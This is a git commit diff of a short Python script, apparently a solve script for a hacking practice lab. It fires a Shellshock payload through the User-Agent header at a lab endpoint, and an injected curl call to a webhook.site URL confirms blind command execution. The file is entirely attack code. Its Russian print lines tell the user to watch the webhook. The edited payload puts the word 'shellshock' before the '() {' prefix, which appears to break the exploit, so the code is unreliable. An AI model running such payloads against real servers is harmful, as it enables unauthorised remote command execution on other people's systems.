4718a5d3741944df33e2ad4cb8cc0e079f495f40
Laplas <61288992+Laplas00@users.noreply.github.com>
2025-06-22 21:30:47 +0300

    new

--- vps-labs-api/__crack_scripts__/blind_ssrf_shellshock.py
+++ vps-labs-api/__crack_scripts__/blind_ssrf_shellshock.py
@@ -1,12 +1,17 @@
 
+
 import requests
 
 url = "http://laplasrouse3-blind_ssrf_shellshock.labs-is-here.online/preview_post/1"
 my_webhook = "https://webhook.site/011a51af-70a0-44fd-b8db-728e59646214"
+payload = f"shellshock () {{ :; }}; curl {my_webhook}"
+
 headers = {
-    "User-Agent": f"() {{ :; }}; curl {my_webhook}"
+    "User-Agent": payload
 }
 
-r = requests.get(url, headers=headers)
-print(r.text)
+response = requests.get(url, headers=headers)
+print("Status code:", response.status_code)
+print("Ответ лаборатории:", response.text)
+print("Проверь свой webhook: должен прийти входящий запрос!")
 
